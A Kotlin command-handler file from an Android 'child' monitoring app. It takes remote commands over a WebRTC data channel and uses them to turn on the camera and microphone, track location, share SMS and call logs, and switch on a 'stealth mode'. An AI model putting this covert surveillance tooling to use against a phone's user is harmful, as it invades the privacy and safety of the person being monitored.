package com.soumo.child.commands

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.soumo.child.components.calllog.CallLogSharing
import com.soumo.child.components.camera.CameraController
import com.soumo.child.components.microphone.MicrophoneController
import com.soumo.child.components.sms.SmsSharing
import org.webrtc.DataChannel

/**
 * Interface for handling commands from the parent application
 */
interface CommandHandler {
    /**
     * Handle a command string from the parent
     * @param cmd The command string to handle
     */
    fun handleCommand(cmd: String)
    
    /**
     * Send a message back to the parent via data channel
     * @param message The message to send
     */
    fun sendDataChannelMessage(message: String)
}

/**
 * Implementation of CommandHandler that can be used by both MainActivity and BackgroundService
 */
class CommandHandlerImpl(
    private val context: Context,
    private val dataChannel: DataChannel?,
    private val cameraController: CameraController?,
    private val microphoneController: MicrophoneController?,
    private val smsSharing: SmsSharing?,
    private val callLogSharing: CallLogSharing?,
    private val isBackgroundService: Boolean = false,
    private val permissionHandler: PermissionHandler? = null,
    private val stealthHandler: StealthHandler? = null,
    private val locationHandler: LocationHandler? = null,
    private val settingsHandler: SettingsHandler? = null
) : CommandHandler {

    override fun handleCommand(cmd: String) {
        try {
            // Try to parse as JSON
            val json = try { org.json.JSONObject(cmd) } catch (_: Exception) { null }
            val command = json?.optString("cmd") ?: cmd.trim()
            val since = json?.optLong("since", 0L) ?: 0L

            when (command) {
                // Camera Commands
                "CAMERA_ON" -> handleCameraOn()
                "CAMERA_OFF" -> handleCameraOff()
                "CAMERA_SWITCH" -> handleCameraSwitch()
                
                // Microphone Commands
                "MIC_ON" -> handleMicOn()
                "MIC_OFF" -> handleMicOff()

                // Location Commands
                "LOCATE_CHILD" -> handleLocateChild()
                "LOCATE_CHILD_STOP" -> handleLocateChildStop()
                
                // SMS Commands
                "SMS_ON" -> handleSmsOn(since)
                "SMS_OFF" -> handleSmsOff()
                
                // Call Log Commands
                "CALLLOG_ON" -> handleCallLogOn(since)
                "CALLLOG_OFF" -> handleCallLogOff()
                
                // Stealth Commands
                "STEALTH_ON" -> handleStealthOn()
                "STEALTH_OFF" -> handleStealthOff()

                // Settings Commands
                "OPEN_SETTINGS" -> handleOpenSettings()
                "CHECK_PERMISSIONS" -> handleCheckPermissions()
                "REQUEST_ALL_PERMISSIONS" -> handleRequestAllPermissions()
                "SHOW_PERMISSION_DIALOG" -> handleShowPermissionDialog(cmd)
                
                else -> {
                    Log.w("CommandHandler", "Unknown command: $cmd")
                    sendDataChannelMessage("UNKNOWN_COMMAND: $cmd")
                }
            }
        } catch (e: Exception) {
            Log.e("CommandHandler", "Unexpected error handling command: $cmd", e)
            sendDataChannelMessage("COMMAND_ERROR: ${e.message}")
        }
    }

    override fun sendDataChannelMessage(message: String) {
        try {
            if (dataChannel?.state() == DataChannel.State.OPEN) {
                val buffer = DataChannel.Buffer(
                    java.nio.ByteBuffer.wrap(message.toByteArray(Charsets.UTF_8)),
                    false
                )
                dataChannel.send(buffer)
                Log.d("DataChannel", "Sent message: $message")
            } else {
                Log.w("DataChannel", "Cannot send message, channel state: ${dataChannel?.state()}")
            }
        } catch (e: Exception) {
            Log.e("DataChannel", "Failed to send message: $message", e)
        }
    }

    // Camera Command Handlers
    private fun handleCameraOn() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                cameraController?.startCamera()
                sendDataChannelMessage("CAMERA_STARTED")
                Log.d("CommandHandler", "Camera started successfully")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start camera", e)
                sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("CAMERA_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Camera permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.CAMERA, 1001, "Camera")
                sendDataChannelMessage("CAMERA_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleCameraOff() {
        try {
            cameraController?.stopCamera()
            sendDataChannelMessage("CAMERA_STOPPED")
            Log.d("CommandHandler", "Camera stopped successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop camera", e)
            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
        }
    }

    private fun handleCameraSwitch() {
        try {
            cameraController?.switchCamera()
            sendDataChannelMessage("CAMERA_SWITCHED")
            Log.d("CommandHandler", "Camera switched successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to switch camera", e)
            sendDataChannelMessage("CAMERA_ERROR: ${e.message}")
        }
    }

    // Microphone Command Handlers
    private fun handleMicOn() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                microphoneController?.startMicrophone()
                sendDataChannelMessage("MIC_STARTED")
                Log.d("CommandHandler", "Microphone started successfully")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start microphone", e)
                sendDataChannelMessage("MIC_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("MIC_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Microphone permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.RECORD_AUDIO, 1002, "Microphone")
                sendDataChannelMessage("MIC_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleMicOff() {
        try {
            microphoneController?.stopMicrophone()
            sendDataChannelMessage("MIC_STOPPED")
            Log.d("CommandHandler", "Microphone stopped successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop microphone", e)
            sendDataChannelMessage("MIC_ERROR: ${e.message}")
        }
    }

    // Location Command Handlers
    private fun handleLocateChild() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                locationHandler?.startLocationTracking()
                sendDataChannelMessage("LOCATION_STARTED")
                Log.d("CommandHandler", "Location tracking started successfully")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start location tracking", e)
                sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("LOCATION_PERMISSION_NEEDS_SETTINGS")
                Log.w("CommandHandler", "Location permission not granted")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION, 1004, "Location")
                sendDataChannelMessage("LOCATION_PERMISSION_REQUESTED")
            }
        }
    }

    private fun handleLocateChildStop() {
        try {
            locationHandler?.stopLocationTracking()
            sendDataChannelMessage("LOCATION_STOPPED")
            Log.d("CommandHandler", "Location tracking stopped successfully")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop location tracking", e)
            sendDataChannelMessage("LOCATION_ERROR: ${e.message}")
        }
    }

    // SMS Command Handlers
    private fun handleSmsOn(since: Long) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                smsSharing?.startSharing()
                sendDataChannelMessage("SMS_STARTED")
                Log.d("CommandHandler", "SMS sharing started (since=$since)")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start SMS sharing", e)
                sendDataChannelMessage("SMS_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_SMS permission")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.READ_SMS, 1005, "SMS")
                sendDataChannelMessage("SMS_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_SMS permission")
            }
        }
    }

    private fun handleSmsOff() {
        if (smsSharing == null) {
            Log.w("CommandHandler", "Tried to stop SMS sharing but it was never started.")
        }
        try {
            smsSharing?.stopSharing()
            sendDataChannelMessage("SMS_STOPPED")
            Log.d("CommandHandler", "SMS sharing stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop SMS sharing", e)
            sendDataChannelMessage("SMS_ERROR: ${e.message}")
        }
    }

    // Call Log Command Handlers
    private fun handleCallLogOn(since: Long) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            == PackageManager.PERMISSION_GRANTED
        ) {
            try {
                callLogSharing?.startSharing()
                sendDataChannelMessage("CALLLOG_STARTED")
                Log.d("CommandHandler", "Call log sharing started (since=$since)")
            } catch (e: Exception) {
                Log.e("CommandHandler", "Failed to start call log sharing", e)
                sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
            }
        } else {
            if (isBackgroundService) {
                sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_CALL_LOG permission")
            } else {
                permissionHandler?.requestPermission(Manifest.permission.READ_CALL_LOG, 1006, "Call Log")
                sendDataChannelMessage("CALLLOG_PERMISSION_REQUESTED")
                Log.d("CommandHandler", "Requested READ_CALL_LOG permission")
            }
        }
    }

    private fun handleCallLogOff() {
        if (callLogSharing == null) {
            Log.w("CommandHandler", "Tried to stop call log sharing but it was never started.")
        }
        try {
            callLogSharing?.stopSharing()
            sendDataChannelMessage("CALLLOG_STOPPED")
            Log.d("CommandHandler", "Call log sharing stopped")
        } catch (e: Exception) {
            Log.e("CommandHandler", "Failed to stop call log sharing", e)
            sendDataChannelMessage("CALLLOG_ERROR: ${e.message}")
        }
    }

    // Stealth Command Handlers
    private fun handleStealthOn() {
        stealthHandler?.activateStealthMode()
        sendDataChannelMessage("STEALTH_ON_ACK")
        Log.d("CommandHandler", "Stealth mode activated")
    }

    private fun handleStealthOff() {
        stealthHandler?.deactivateStealthMode()
        sendDataChannelMessage("STEALTH_OFF_ACK")
        Log.d("CommandHandler", "Stealth mode deactivated")
    }

    // Settings Command Handlers
    private fun handleOpenSettings() {
        settingsHandler?.openAppSettings()
        sendDataChannelMessage("SETTINGS_OPENED")
        Log.d("CommandHandler", "Opening app settings")
    }

    private fun handleCheckPermissions() {
        // Delegate to context-specific handler so the host (Activity/Service)
        // can decide how to compute and send results.
        settingsHandler?.checkPermissionStatus()
        Log.d("CommandHandler", "Checking permission status via settings handler")
    }

    private fun handleRequestAllPermissions() {
        settingsHandler?.requestAllPermissions()
        sendDataChannelMessage("ALL_PERMISSIONS_REQUESTED")
        Log.d("CommandHandler", "Requesting all permissions again")
    }

    private fun handleShowPermissionDialog(cmd: String) {
        val featureName = cmd.split(":")[1].ifEmpty { "Unknown" }
        settingsHandler?.showPermissionSettingsDialog(featureName)
        sendDataChannelMessage("PERMISSION_DIALOG_SHOWN")
        Log.d("CommandHandler", "Showing permission dialog for: $featureName")
    }
}

/**
 * Interface for handling permission requests
 */
interface PermissionHandler {
    fun requestPermission(permission: String, requestCode: Int, featureName: String)
}

/**
 * Interface for handling stealth mode operations
 */
interface StealthHandler {
    fun activateStealthMode()
    fun deactivateStealthMode()
}

/**
 * Interface for handling location operations
 */
interface LocationHandler {
    fun startLocationTracking()
    fun stopLocationTracking()
}

/**
 * Interface for handling settings and permission operations
 */
interface SettingsHandler {
    fun openAppSettings()
    fun checkPermissionStatus()
    fun requestAllPermissions()
    fun showPermissionSettingsDialog(featureName: String)
}
